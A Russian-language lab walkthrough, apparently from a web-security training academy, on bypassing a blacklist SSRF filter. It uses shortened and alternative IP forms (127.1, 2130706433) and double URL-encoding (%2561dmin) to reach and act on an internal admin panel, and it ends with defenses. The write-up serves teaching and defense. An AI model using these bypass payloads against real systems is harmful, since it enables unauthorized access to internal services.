<a id="theory"></a>

## 🧠 Краткая теория

В предыдущих лабах приложение вообще не фильтровало `stockApi`. В этой лабе разработчик добавил защиту — **blacklist**:

```text
блокируется адрес 127.0.0.1 (и, возможно, localhost);
блокируется слово admin в URL.
```

Blacklist — это перечисление «плохих» строк. Он работает, пока атакующий использует именно те строки, которые разработчик перечислил. Но у одного и того же адреса есть **бесчисленное количество представлений**, и фильтр, сравнивающий строки, узнаёт не все.

---

<a id="idea"></a>

## 🧩 Ключевая идея

Фильтр сравнивает **строки**, а сетевой стек понимает **IP-адреса и пути**. Эти два уровня видят запрос по-разному:

```text
Фильтр видит:      http://127.1/%2561dmin
Сетевой стек видит: http://127.0.0.1/admin
```

Ровно этот разрыв и эксплуатируется:

```text
127.1       → сетевой стек понимает как 127.0.0.1, а фильтр не блокирует
%2561dmin   → фильтр декодирует один раз и не видит "admin",
              а HTTP-клиент декодирует ещё раз и идёт на /admin
```

---

<a id="blacklist"></a>

## 🚫 Что такое blacklist-фильтр

Логика примерно такая:

```python
blocked_strings = ["127.0.0.1", "localhost", "admin"]

for bad in blocked_strings:
    if bad in url:
        return "Blocked"
```

Слабые места blacklist:

```text
1. Перечисление не может покрыть все варианты записи одного адреса.
2. Проверка строки ≠ проверка того, куда реально пойдёт запрос.
3. Декодирование на стороне фильтра и клиента можно рассинхронизировать.
```

Формула противостояния:

```text
Blacklist = "я знаю все плохие варианты"
Атака     = "я придумаю вариант, который ты не знаешь"
```

<a id="ip-forms"></a>

## 📐 Альтернативные представления IP

Адрес `127.0.0.1` можно записать множеством способов:

| Форма | Запись | Как получается |
|---|---|---|
| Обычная | `127.0.0.1` | стандартный dotted quad |
| Десятичная (integer) | `2130706433` | `127×256³ + 0×256² + 0×256 + 1` |
| Восьмеричная | `017700000001` | каждый октет в 8-й системе: `0177.0.0.01` |
| Шестнадцатеричная | `0x7f000001` | `0x7f` = 127 |
| Сокращённая | `127.1` | пропущенные октеты = 0 |
| Сокращённая | `127.0.1` | тоже читается как `127.0.0.1` |

Как посчитать десятичную форму:

```text
127 × 16777216 = 2130706432   (это 127.0.0.0)
+ 1                           (последний октет)
= 2130706433                  (это 127.0.0.1)
```

Ключевой приём лабы:

```text
127.1
```

URL-парсер понимает, что октетов меньше четырёх, добивает недостающие нулями и получает `127.0.0.1`. Фильтр ищет подстроку `127.0.0.1` — в `127.1` её нет → блокировка обойдена.

<a id="encoding"></a>

## 🔤 URL-кодирование и регистр

Слово `admin` можно спрятать от фильтра:

```text
Одинарное кодирование:   /%61dmin        → после декодирования /admin
Двойное кодирование:     /%2561dmin      → %25 → %, затем %61 → a
Регистр:                 /AdMiN, /ADMIN  → пути часто регистронезависимы
```

Почему двойное кодирование работает:

```text
Фильтр:        http://127.1/%2561dmin
               декодирует один раз → http://127.1/%61dmin
               подстроки "admin" нет → пропуск ✅

HTTP-клиент:   http://127.1/%61dmin
               декодирует ещё раз → GET /admin ✅
```

Схема рассинхронизации:

```text
Фильтр:      %2561dmin ──(decode ×1)──> %61dmin   → "admin" не найден
Клиент:      %61dmin   ──(decode ×1)──> admin      → запрос уходит на /admin
```

Принцип тот же, что в Path Traversal с null byte:

```text
Там:   проверка видит "…passwd%00.png", файловая система — "…passwd"
Здесь: фильтр видит "%2561dmin", HTTP-клиент — "admin"
```

**Проверка и исполнение видят разные строки** — корень всех этих обходов.

<a id="step2"></a>

## 🔍 Шаг 2 — Подтвердить уязвимость и закартировать фильтр

По очереди пробовать разные значения `stockApi` и записывать ответы:

```text
stockApi=http://127.0.0.1/admin        → блокировка (фильтр узнал адрес)
stockApi=http://localhost/admin        → блокировка (фильтр узнал hostname)
stockApi=http://127.1/admin            → пропуск IP, но блокировка слова admin
stockApi=http://2130706433/admin       → результат зависит от фильтра
stockApi=http://017700000001/admin     → результат зависит от фильтра
```

Так строится карта фильтра:

```text
Что именно блокируется: 127.0.0.1? localhost? слово "admin"?
Какие формы адреса проходят: 127.1? десятичная? восьмеричная?
```

В этой лабе фильтр содержит два правила:

```text
правило 1: 127.0.0.1 (и похожие строки) → блок
правило 2: admin                        → блок
```

<a id="step3"></a>

## 🔍 Шаг 3 — Обойти блокировку IP через 127.1

Заменить адрес на сокращённую форму:

```text
stockApi=http://127.1/admin
```

Что происходит:

```text
Фильтр ищет "127.0.0.1" → в "127.1" не находит → пропускает адрес
URL-парсер понимает "127.1" как 127.0.0.1     → запрос идёт на loopback
```

Но ответ приходит с ошибкой — потому что слово `admin` всё ещё блокируется вторым правилом.

<a id="step4"></a>

## 🔍 Шаг 4 — Обойти блокировку слова admin через двойное кодирование

Заменить путь на двойное кодирование:

```text
stockApi=http://127.1/%2561dmin
```

Разбор:

```text
%25     → символ % (одно декодирование)
%61     → буква a
dmin    → остаток слова
```

Итог после всех декодирований:

```text
%2561dmin  →  %61dmin  →  admin
```

Запрос:

```http
POST /product/stock HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Type: application/x-www-form-urlencoded
Content-Length: 35

stockApi=http://127.1/%2561dmin
```

Ответ — админ-интерфейс.

<a id="breakdown"></a>

## 🔬 Почему атака сработала

### 1. Фильтр сравнивает строки, а не адреса

Blacklist ищет подстроку `127.0.0.1`, но `127.1` — другая строка. Сетевой стек при этом понимает `127.1` как тот же самый `127.0.0.1`.

### 2. Форм записи одного адреса бесконечно много

Десятичная, восьмеричная, шестнадцатеричная, сокращённые формы — перечислить все в blacklist невозможно.

### 3. Декодирование рассинхронизировано

Фильтр декодирует URL один раз и не видит `admin` в `%2561dmin`. HTTP-клиент декодирует ещё раз и запрашивает `/admin`.

### 4. Оба обхода комбинируются в одном URL

`127.1` обходит первое правило, `%2561dmin` — второе. Вместе они дают полный доступ к админке.

### 5. Внутренний сервис не требует аутентификации

Админка на loopback доверяет любому запросу изнутри — после обхода фильтров атакующий получает полный контроль.

<a id="pentester"></a>

## 🧠 Как думать как пентестер

Когда видишь, что фильтр заблокировал запрос — не сдавайся, а закартируй его:

```text
Что именно он блокирует: строку? слово? hostname? путь?
```

```text
Какие альтернативные формы адреса я могу попробовать?
```

```text
Декодирует ли фильтр URL? Один раз или два? А HTTP-клиент?
```

```text
Регистронезависимы ли пути в приложении?
```

Чек-лист обходов SSRF-фильтров:

```text
127.0.0.1  →  127.1 / 2130706433 / 017700000001 / 0x7f000001
localhost  →  spoofed.burpcollaborator.net / свой домен на 127.0.0.1
/admin     →  /%61dmin / %2561dmin / /AdMiN
фильтр URL →  open redirect: /redirect?url=http://127.0.0.1/admin
```

<a id="mistakes"></a>

## ❌ Типичные ошибки

### Ошибка 1. Остановиться на первом заблокированном запросе

`127.0.0.1/admin` заблокирован — это не конец, а начало карты фильтра.

### Ошибка 2. Использовать только одну форму обхода

Нужно обойти **два** правила: адрес и слово `admin`. `127.1` без кодирования пути не решает задачу.

### Ошибка 3. Путать одинарное и двойное кодирование

`%61dmin` фильтр декодирует до `admin` и блокирует. Нужно именно `%2561dmin`.

### Ошибка 4. Кодировать неправильную часть URL

Кодировать нужно слово `admin` в пути, а не весь URL.

### Ошибка 5. Забыть про путь в финальном запросе

При удалении пользователя путь `/delete?username=carlos` присоединяется к обходной форме `/admin`:

```text
/%2561dmin/delete?username=carlos
```

### Ошибка 6. Отправлять финальный запрос на обычный путь

`/admin/delete?username=carlos` снова упрётся в фильтр слова `admin`.

### Ошибка 7. Не следить за Content-Length

При ручном изменении тела запроса убедиться, что `Content-Length` соответствует новой длине (Repeater обновляет автоматически по умолчанию).

<a id="defense"></a>

## 🛡 Защита

### 1. Whitelist вместо blacklist

Разрешать только известные хорошие значения, а не блокировать известные плохие:

```python
allowed_apis = {
    "stock": "http://internal-stock-api:8080/check",
}
api = allowed_apis[user_input]
```

### 2. Валидация на уровне разрешённого IP

Резолвить hostname, проверять, что итоговый IP не в приватных диапазонах:

```text
127.0.0.0/8        loopback
10.0.0.0/8         приватные
172.16.0.0/12      приватные
192.168.0.0/16     приватные
169.254.169.254    облачные метаданные
```

### 3. Защита от DNS rebinding

Проверять IP после резолва и выполнять запрос именно на этот IP.

### 4. Канонизировать URL перед проверкой

Декодировать URL (один раз, до конца), приводить к каноническому виду, и только потом проверять.

### 5. Аутентификация внутренних сервисов

Админки и API не должны доверять запросам только из-за сетевого расположения.

### 6. Egress-фильтрация и сегментация

Ограничить, куда приложение может ходить (network policy, firewall).

### 7. Логировать исходящие запросы

Фиксировать URL, чтобы обнаружить сканирование и обходы.
